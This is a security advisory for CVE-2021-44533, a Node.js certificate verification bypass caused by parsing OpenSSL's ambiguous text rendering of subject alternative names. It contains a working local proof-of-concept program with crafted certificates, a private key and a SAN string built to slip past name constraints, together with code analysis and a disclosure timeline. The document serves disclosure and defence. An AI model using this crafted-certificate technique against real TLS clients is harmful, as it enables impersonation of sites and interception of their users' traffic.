---
title: 'Node: Node.js certificate verification bypass via string injection'
severity: Moderate
ghsa_id: GHSA-qj66-5v86-jmjc
cve_id: CVE-2021-44533
weaknesses: []
products:
- ecosystem: npm
  package_name: node
  affected_versions: '>=0.5.6'
  patched_versions: '>=17.4.0'
cvss: null
credits: []
---

### Summary
Node’s APIs for reporting certificate fields are ambiguous and allow bypassing certificate verification in some circumstances.

### Severity
Medium - Node misinterprets certificate contents in name validation. This can cause certificate verification bypasses in some circumstances. For example, the holder of a name-constrained intermediate can trick Node into accepting certificates for a name outside the constraint. This attack requires either an attacker having a name-constrained intermediate CA or have some other way for the attacker to obtain a signed certificate for an invalid subdomain (eg, `nodejs.org, DNS:x`) or other equivalent attack scenarios.

### Proof of Concept
The following program demonstrates a certificate chain with an intermediate constrained to `attacker.example` and a leaf certificate with a _single_ subject alternative name (SAN) entry, `nodejs.org, DNS:blah.attacker.example`. This string contains `.attacker.example` as a suffix, so OpenSSL's certificate verifier accepts it as matching the name constraint. However, as that single string does not match `nodejs.org`, the certificate should not be accepted for `nodejs.org`.

```javascript
const crypto = require("crypto");
const fs = require("fs");
const tls = require("tls");

const rootPEM = `-----BEGIN CERTIFICATE-----
MIIBQTCB56ADAgECAgEBMAoGCCqGSM49BAMCMA8xDTALBgNVBAMTBFJvb3QwIBcN
MDAwMTAxMDAwMDAwWhgPMjA5OTAxMDEwMDAwMDBaMA8xDTALBgNVBAMTBFJvb3Qw
WTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAR7DaOQvpvA47q2XxjMqxJVf/FvZm2f
tiFRXNJMe/fhSlDh2CybdkFIw2mE5g4ShW5UBJe+sohqy5V9WRkYtM/BozIwMDAP
BgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBQlGcYbYohaK3S+XGeqCTi4LLHeLTAK
BggqhkjOPQQDAgNJADBGAiEA+Y5oEpcG6aRK5qQFLYRi2FrOSSLF1/dI4HtBh0mk
GFoCIQD1DpNg6m5ZaogRW1mY1wmR5HFIr3gG8PYDRimQogXUxg==
-----END CERTIFICATE-----
`;
const intermediatePEM = `-----BEGIN CERTIFICATE-----
MIIBjjCCATSgAwIBAgIBAjAKBggqhkjOPQQDAjAPMQ0wCwYDVQQDEwRSb290MCAX
DTAwMDEwMTAwMDAwMFoYDzIwOTkwMTAxMDAwMDAwWjAXMRUwEwYDVQQDEwxJbnRl
cm1lZGlhdGUwWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAR7DaOQvpvA47q2XxjM
qxJVf/FvZm2ftiFRXNJMe/fhSlDh2CybdkFIw2mE5g4ShW5UBJe+sohqy5V9WRkY
tM/Bo3cwdTAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBQlGcYbYohaK3S+XGeq
CTi4LLHeLTAfBgNVHSMEGDAWgBQlGcYbYohaK3S+XGeqCTi4LLHeLTAiBgNVHR4B
Af8EGDAWoBQwEoIQYXR0YWNrZXIuZXhhbXBsZTAKBggqhkjOPQQDAgNIADBFAiEA
uZhmF3buUdhzHjXLZQSOyT41DqUUX/VKBEraDu+gj+wCIG/R1arbHFRFnEuoVgZI
bihwUpUZjIZ5YwJcBu6yuXlZ
-----END CERTIFICATE-----
`;
const leafPEM = `-----BEGIN CERTIFICATE-----
MIIBejCCASCgAwIBAgIBBTAKBggqhkjOPQQDAjAXMRUwEwYDVQQDEwxJbnRlcm1l
ZGlhdGUwIBcNMDAwMTAxMDAwMDAwWhgPMjA5OTAxMDEwMDAwMDBaMA8xDTALBgNV
BAMTBExlYWYwWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAR7DaOQvpvA47q2XxjM
qxJVf/FvZm2ftiFRXNJMe/fhSlDh2CybdkFIw2mE5g4ShW5UBJe+sohqy5V9WRkY
tM/Bo2MwYTAMBgNVHRMBAf8EAjAAMB8GA1UdIwQYMBaAFCUZxhtiiFordL5cZ6oJ
OLgssd4tMDAGA1UdEQQpMCeCJW5vZGVqcy5vcmcsIEROUzpibGFoLmF0dGFja2Vy
LmV4YW1wbGUwCgYIKoZIzj0EAwIDSAAwRQIgWfT1VXQA79PxgM0DsfeoiwZCc2Be
v3/RCRYoRky9DgICIQDUTjndnBQ0KeIWhuMjtSz1C5uPUYofKe7pV2qb/57kvA==
-----END CERTIFICATE-----
`;
const keyPEM = `-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgaNbpDxJET5xVHxd/
ig5x2u2KUIe0jaCVWqarpIN/582hRANCAAR7DaOQvpvA47q2XxjMqxJVf/FvZm2f
tiFRXNJMe/fhSlDh2CybdkFIw2mE5g4ShW5UBJe+sohqy5V9WRkYtM/B
-----END PRIVATE KEY-----
`;

console.log("The intermediate certificate is name-constrained to attacker.example.");
console.log("No leaf certificate valid for nodejs.org should be possible.");

const port = 8443;
tls.createServer({key: keyPEM, cert: leafPEM + intermediatePEM}, (socket) => {
  // We just need the handshake to complete, so don't do anything.
}).listen(port);

const socket = tls.connect(port, {
  ca: rootPEM,
  servername: "nodejs.org",
}, () => {
  console.log("FAIL: Connection unexpectedly succeeded.");
});
socket.on("error", (err) => {
  console.log("PASS: Connecting correctly failed: " + err);
});
```

The intermediate certificate has the following constraints:
```
        X509v3 extensions:
            X509v3 Basic Constraints: critical
                CA:TRUE
            X509v3 Subject Key Identifier: 
                25:19:C6:1B:62:88:5A:2B:74:BE:5C:67:AA:09:38:B8:2C:B1:DE:2D
            X509v3 Authority Key Identifier: 
                keyid:25:19:C6:1B:62:88:5A:2B:74:BE:5C:67:AA:09:38:B8:2C:B1:DE:2D

            X509v3 Name Constraints: critical
                Permitted:
                  DNS:attacker.example
```

The malicious certificate contains the following:
```
        X509v3 extensions:
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Authority Key Identifier: 
                keyid:25:19:C6:1B:62:88:5A:2B:74:BE:5C:67:AA:09:38:B8:2C:B1:DE:2D

            X509v3 Subject Alternative Name: 
                DNS:nodejs.org, DNS:blah.attacker.example
```

Note `nodejs.org, DNS:blah.attacker.example` is the SAN.

### Further Analysis
In light of CVE-2021-3712, we've been looking at code which misuses OpenSSL’s printing functions. Node’s use will cause it to misparse certificates, and, it appears to allow certificate verification bypasses in some circumstances, such as a name-constrained intermediate. It’s also just a generally unsafe pattern.

For background, the OpenSSL utility has options like `openssl x509 -text` which output some human-readable text representation of the certificate. This gives output like:

```
            X509v3 Subject Alternative Name:  
                DNS:*.nodejs.org, DNS:nodejs.org
```

Certificates are not text. They use a structured binary encoding, called DER. Fields may contain commas, spaces, or any other byte. The text representation is just an ad-hoc diagnostic output by OpenSSL. It has no well-defined grammar and does not even escape characters, so the output is ambiguous. It should not be parsed.

OpenSSL has functions for the text format in the library itself. These are `X509_print`, `i2v_GENERAL_NAME`, `X509V3_EXT_val_prn`, `X509V3_EXT_print`, and others. But, these are still for diagnostics, not a well-defined serialization of the certificate.

Unfortunately, it looks like Node tries to parse this output to interpret the certificate itself:
https://github.com/nodejs/node/blob/95834d11a23b224f1abcc71a868d3cade4763717/src/crypto/crypto_x509.cc#L219
https://github.com/nodejs/node/blob/95834d11a23b224f1abcc71a868d3cade4763717/src/crypto/crypto_x509.cc#L229
https://github.com/nodejs/node/blob/95834d11a23b224f1abcc71a868d3cade4763717/src/crypto/crypto_common.h#L162
https://github.com/nodejs/node/blob/95834d11a23b224f1abcc71a868d3cade4763717/src/crypto/crypto_common.cc#L678
(Despite the name, SafeX509ExtPrint is not safe.)
https://github.com/nodejs/node/blob/95834d11a23b224f1abcc71a868d3cade4763717/lib/_tls_common.js#L133
https://github.com/nodejs/node/blob/95834d11a23b224f1abcc71a868d3cade4763717/lib/tls.js#L239

The last instance is especially concerning. If a certificate is issued for, say, `nodejs.org, DNS:blah.attacker.example`, certificate issuance or verification may reason, “this has `.attacker.example` as a suffix, which you own, so this certificate is fine”. Meanwhile, Node sees a text output of `DNS:nodejs.org, DNS:blah.attacker.example` and misinterprets it as two names, one of which is nodejs.org. Concretely, this may happen if a CA issues a name-constrained intermediate certificate to `attacker.example`. OpenSSL performs the name constraint check against the correct parse, then Node misinterprets the certificate and bypasses the name constraint.

This is similar to the [old null prefix attack](https://www.blackhat.com/presentations/bh-usa-09/MARLINSPIKE/BHUSA09-Marlinspike-DefeatSSL-PAPER1.pdf) from 11 years ago. Other SAN types may also be injection vectors.

Additionally, as this is not the intended use, OpenSSL’s print functions receive less attention than other parts of their X.509 stack. Indeed not mentioned in the CVE-2021-3712 advisory is that the print functions silently truncated their outputs on interior NUL bytes. That makes uses like Node’s vulnerable to exactly the old null prefix attack from 11 years ago. (The `GEN_DNS` special case in `SafeX509ExtPrint` avoids it for DNS SANs, but other SAN types are still truncated.)

Instead, Node should look at the `GENERAL_NAME` structure, which will give the actual fields unambiguously, or call into the high-level OpenSSL functions that check hostnames.

Note also that extracting DNS names from the subject common name, as opposed to the SAN list, is outdated. Browsers do not do it anymore, and the IETF is [updating the specifications to match](https://datatracker.ietf.org/doc/html/draft-ietf-uta-rfc6125bis-01). Consider removing it from `checkServerIdentity`.
https://github.com/nodejs/node/blob/95834d11a23b224f1abcc71a868d3cade4763717/lib/tls.js#L281

### Timeline
**Date reported**: September 28 2021
**Date fixed**: January 10 2022
**Date disclosed**: January 28 2022
* 2021-09-28 - Initial vulnerability report with deadline of December 27 per [Google's vulnerability disclosure policy](https://about.google/appsecurity/)
* 2021-09-30 - Reproducers provided by Google and variant of the issue identified as well
* 2021-10-01 - Request by Node to not make any disclosures at all without *[[Node]]* clearly indicating that *[[they]]* are ready.
* 2021-10-01 - Response by Google explaining [Google's vulnerability disclosure policy](https://about.google/appsecurity/)
* 2021-10-14 - Google connects Node to OpenSSF and the Linux Foundation to obtain help and resources for vulnerability response
* 2021-11-03 to 2021-12-02 - Google and Node discuss technical details of the vulnerability and fix by email
* 2021-11-24 - Request by Node for an extension to the deadline to at least the end of January
* 2021-11-24 - Response by Google explaining [Google's vulnerability disclosure policy](https://about.google/appsecurity/) (with a maximum delay to January 10)
* 2021-12-06 - Meeting between Node and Google. Node requested to delay disclosure to end of January. Google explained vulnerability disclosure policy
* 2021-12-06 - OpenJS Foundation asks Google for a vulnerability disclosure extension to end of January.
* 2021-12-10 - Google explains that it can delay to January 10 if there's a scheduled release by then.
* 2021-12-11 - OpenJS Foundation asks Google to not disclose the issue at a time when many enterprise engineering teams are not working.
* 2021-12-14 - Google explains rationale and the goals of [Google's vulnerability disclosure policy](https://about.google/appsecurity/). If NodeJS pushes a fix before December 27 or schedules a release before January 10 then Google wouldn't disclose the issue until late January. If NodeJS makes the issue public earlier it would avoid it being disclosed during the holiday break.
* 2021-12-23 - NodeJS finalized patches and scheduled them to be released on January 10 2022.
* 2022-01-10 - NodeJS publishes [security advisory](https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/) and fixes.
* 2022-01-28 - Advisory is made public.